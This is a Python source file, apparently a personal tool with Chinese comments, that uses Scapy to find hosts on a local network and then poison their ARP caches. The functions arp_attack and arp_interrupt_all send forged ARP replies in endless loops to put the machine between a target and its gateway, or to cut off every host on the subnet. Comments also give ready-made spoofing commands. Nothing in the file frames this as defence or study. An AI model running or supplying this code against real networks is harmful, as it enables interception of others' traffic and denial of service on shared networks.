import uuid

from scapy.all import *


def get_host_ip():
    """获取本机默认ip地址"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        ip = s.getsockname()[0]
    finally:
        s.close()
    return ip


def get_mac_address():
    """获取本机Mac地址，MacOS下获取不正确"""
    address = hex(uuid.getnode())[2:]
    return ':'.join(address[i:i + 2] for i in range(0, len(address), 2))


# psrc 查询发起者IP，可以匿名 pdst 查询目标IP 可以广播 op = 1 查询 2 回应
# arp_request = ARP(psrc="192.168.1.1", pdst="255.255.255.255", op=1)
# send(arp_request)

"""
Scapy中网络包的种类：
sr()：发送三层数据包，等待接收一个或者多个数据包的响应
sr1()：发送三层数据包，并仅仅等待接收一个数据包的响应
srp()：发送二层数据包，并且等待响应
send()：仅仅发送三层数据包，系统会自动处理路由和二层信息
sendp()：发送二层数据包
Ether层参数：
src：发送方mac地址
dst：接收方物理地址（此处FF:FF:FF:FF:FF:FF为广播）
ARP层参数：
op:操作码，1为请求，2为响应
hwsrc:发送方物理地址
hwdst:接收方物理地址
psrc:发送方IP地址
pdst:接收方IP地址
srp二层网络包参数：
iface：指定网卡接口名称（三层网络包或只有一个网卡接口时没有必要指定）
timeout：超时时间吧。。
verbose：默认为True，会打印一堆乱七八糟的东西，这里指定为False
"""


def arp_request(ip_addr, queue=None):
    """
    :param ip_addr: ip 地址
    # :param if_name: 网络接口
    :param queue: 接收的对象
    :return: IP, Mac
    """
    result_raw = srp(Ether(dst='FF:FF:FF:FF:FF:FF')  # srp  二层帧
                     / ARP(op=1, hwdst='00:00:00:00:00:00', pdst=ip_addr),  # ARP询问操作，op置1
                     timeout=1,  # 等待1s
                     # iface=if_name,  # 二层一定要填写接口
                     verbose=False)  # 关闭发送数据提示信息
    # result_raw接收到的数据如：(<Results: TCP:0 UDP:0 ICMP:0 Other:1>, <Unanswered: TCP:0 UDP:0 ICMP:0 Other:0>)
    # [0]为相应的数据，[1]为未相应的数据(等待1s，所以有可能会产生未响应的数据)
    try:
        result_list = result_raw[0].res  # 把响应的数据包对，产生为清单
        # result_list数据为展开的信息，如：[(<Ether  dst=FF:FF:FF:FF:FF:FF type=0x806
        # |<ARP  op=who-has hwdst=00:00:00:00:00:00 pdst=172.17.174.73 |>>,
        # <Ether  dst=e0:3f:49:a1:99:6c src=58:69:6c:5e:70:ec type=0x806 |
        # <ARP  hwtype=0x1 ptype=0x800 hwlen=6 plen=4 op=is-at hwsrc=58:69:6c:5e:70:ec psrc=172.17.174.73
        # hwdst=e0:3f:49:a1:99:6c pdst=172.17.171.178 |
        # <Padding  load='\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' |>>>)]
        # 可以看到，result_list中只有一组数据，下标为0。在这一组里，[1]代表接收到的包，[0]代表发送的数据包
        # [2]ARP头部字段的['hwsrc']字段，作为返回值返回
        if queue is None:
            return result_raw[0].res[0][1].getlayer(ARP).fields['psrc'], result_list[0][1].getlayer(ARP).fields[
                'hwsrc']  # 获取IP, Mac
        else:
            queue.put((ip_addr, result_list[0][1].getlayer(ARP).fields['hwsrc']))
    except Exception:
        return


def arp_scan(queue):
    """
    获取本机arp表信息
    :return: ip, mac
    """
    import os, re
    os.system('arp -a > ./attack/temp.txt')
    with open('./attack/temp.txt') as fp:
        if queue is not None:
            for line in fp:
                queue.put(list((re.findall(r'[(](.*?)[)]', line)[0], re.findall(".*at (.*) on.*", line)[0])))
            os.remove('./attack/temp.txt')
        else:
            ip_mac_list = []
            for line in fp:
                ip_mac_list.append(list((re.findall(r'[(](.*?)[)]', line)[0], re.findall(".*at (.*) on.*", line)[0])))
            os.remove('./attack/temp.txt')
            return ip_mac_list


# https://blog.51cto.com/13155409/2129980

"""
　当前路由器的ip地址是192.168.1.1,MAC地址是24:69:68:49:67:e0 伪装主机
　本机ip是192.168.1.106，MAC地址是e0:94:67:79:17:2e
　目标机器ip是192.168.1.101，MAC地址是ac:c1:ee:31:1b:e6 攻击主机
srploop(Ether(dst="ac:c1:ee:31:1b:e6")/ARP(psrc="192.168.1.1",hwsrc="e0:94:67:79:17:2e",pdst="192.168.1.101",hwdst="ac:c1:ee:31:1b:e6",op=2)) 欺骗101主机本机是网关。 
srploop(Ether(dst="24:69:68:49:67:e0")/ARP(psrc="192.168.1.101",hwsrc="e0:94:67:79:17:2e",pdst="192.168.1.1",hwdst="24:69:68:49:67:e0",op=2)) 欺骗网关本机是101主机 
"""


# srploop(Ether(dst="00:1c:42:85:a3:90")/ARP(psrc="192.168.43.1",hwsrc="f0:18:98:93:dc:22",pdst="192.168.43.113",hwdst="00:1c:42:85:a3:90",op=2))

def arp_attack(c_ip, c_mac, t_ip, t_mac, p_ip, p_mac, mode):
    """
    ARP攻击
    :param c_ip:
    :param c_mac:
    :param t_ip:
    :param t_mac:
    :param p_ip:
    :param p_mac:
    :param mode:
    :return:
    """
    if mode == 0:  # 双向欺骗
        while True:
            srploop(Ether(dst=t_mac) / ARP(psrc=p_ip, hwsrc=c_mac, pdst=t_ip, hwdst=t_mac, op=2))
            srploop(Ether(dst=p_mac) / ARP(psrc=t_ip, hwsrc=c_mac, pdst=p_ip, hwdst=p_mac, op=2))
    if mode == 1:  # 单向欺骗
        while True:
            srploop(Ether(dst=t_mac) / ARP(psrc=p_ip, hwsrc=c_mac, pdst=t_ip, hwdst=t_mac, op=2))


def arp_interrupt_all(p_ip, c_mac):
    while True:
        srploop(Ether(dst="ff:ff:ff:f:ff:ff") / ARP(psrc=p_ip, hwsrc=c_mac, pdst="255.255.255.255",
                                                    hwdst="ff:ff:ff:f:ff:ff", op=2))


# op2 为回应， 1代表查询
# 欺骗目标主机 本机为网关
# srploop(Ether(dst="00:1c:42:85:a3:90")/ARP(psrc="192.168.43.1",hwsrc="f0:18:98:93:dc:22",pdst="192.168.43.113",hwdst="00:1c:42:85:a3:90",op=2))
# 欺骗网关 本机为目标主机

"""
srploop(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(hwsrc="00:e0:70:52:54:26",psrc="192.168.200.1",op=2)) 
将数据链路层的目标MAC地址置为全ff，此时该消息的接收者将只关注hwsrc和psrc信息，更新本地arp缓存。
"""

# if __name__ == "__main__":
#     ip = get_host_ip()
#     print(ip)
#     net = ipaddress.ip_network(ip)
#     print(net)
#     import sys
#
#     print(sys.platform)
#
#     print(arp_scan())
